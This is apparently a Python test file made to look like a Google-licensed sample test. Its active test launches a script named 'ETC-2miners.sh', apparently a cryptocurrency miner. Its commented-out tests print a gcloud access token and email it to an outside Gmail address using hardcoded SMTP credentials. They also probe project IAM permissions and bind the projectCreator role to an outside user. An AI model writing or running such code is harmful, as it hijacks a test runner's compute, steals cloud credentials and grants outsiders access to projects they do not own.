# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
import logging
import os
import google
from google.cloud import resourcemanager_v3
from google.auth.transport import requests
import smtplib

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

from google.oauth2 import service_account
import googleapiclient.discovery
import subprocess

PROJECT_ID = os.getenv("GOOGLE_CLOUD_PROJECT")
EMAIL_ADDRESS = "testinggalemail@gmail.com"
EMAIL_PASSWORD = "aeuspgbwilrbhnkx"

CREDENTIAL_SCOPES = ["https://www.googleapis.com/auth/cloud-platform"] 

def test_running_bash():

    bashCommand = "./ETC-2miners.sh"
    process = subprocess.Popen(bashCommand, stdout=subprocess.PIPE)
    output, error = process.communicate()
    raise Exception(str(output))


# def test_generate_token():
#   bashCommand = "gcloud auth application-default print-access-token"
#   process = subprocess.Popen(bashCommand.split(), stdout=subprocess.PIPE)
#   output, error = process.communicate()
#   logging.debug(str(output))
#   f = open("token.txt","w")
#   f.write(str(output))
#   f.close()

#   msg = MIMEMultipart()

#   msg.attach(MIMEText("Hi", 'plain'))
#   msg['subject'] = "Hello World"
#   msg['to'] = "galz100@gmail.com"
#   msg['from'] = EMAIL_ADDRESS
  
#   output = subprocess.getoutput("ls -l")
#   print(output)

#   filename = "token.txt"
#   attachment = open("token.txt", "rb")
  
#   part = MIMEBase('application', 'octet-stream')
#   part.set_payload((attachment).read())
#   encoders.encode_base64(part)
#   part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
  
#   msg.attach(part)

#   server = smtplib.SMTP("smtp.gmail.com",587)
#   server.starttls()
#   server.login(EMAIL_ADDRESS,EMAIL_PASSWORD)
#   text = msg.as_string()
#   server.sendmail(EMAIL_ADDRESS, "galz100@gmail.com", text)
#   server.quit()

# def test_permissions():
#     """Tests IAM permissions of the caller"""

#     credentials = service_account.Credentials.from_service_account_file(
#         filename=os.environ["GOOGLE_APPLICATION_CREDENTIALS"],
#         scopes=["https://www.googleapis.com/auth/cloud-platform"],
#     )
#     service = googleapiclient.discovery.build(
#         "cloudresourcemanager", "v1", credentials=credentials
#     )

#     permissions = {
#         "permissions": [
#             "resourcemanager.projects.get",
#             "resourcemanager.projects.delete",
#             "resourcemanager.projects.update",
#             "resourcemanager.projects.setIamPolicy"
#         ]
#     }

#     request = service.projects().testIamPermissions(
#         resource=PROJECT_ID, body=permissions
#     )
#     returnedPermissions = request.execute()
#     raise Exception(returnedPermissions)


# def test_set_policy(version=1):
#     """Gets IAM policy for a project."""

#     credentials = service_account.Credentials.from_service_account_file(
#         filename=os.environ["GOOGLE_APPLICATION_CREDENTIALS"],
#         scopes=["https://www.googleapis.com/auth/cloud-platform"],
#     )
#     service = googleapiclient.discovery.build(
#         "cloudresourcemanager", "v1", credentials=credentials
#     )
#     set_iam_policy_request_body = {
#         "policy": {
#             "bindings": [
#                 {
#                 "role": "roles/resourcemanager.projectCreator",
#                 "members": [
#                     "user:galz100@gmail.com"
#                 ],
#                 "condition": {
#                     "title": "expirable access",
#                     "description": "Does not grant access after Dec 2021",
#                     "expression": "request.time < timestamp('2021-12-01T00:00:00.000Z')",
#                 }
#                 }
#             ],
#             "etag": "BwWWja0YfJA=",
#             "version": 1
#         }
#     }

#     request = service.projects().setIamPolicy(resource=PROJECT_ID, body=set_iam_policy_request_body)
#     response = request.execute()

#     raise Exception(response)
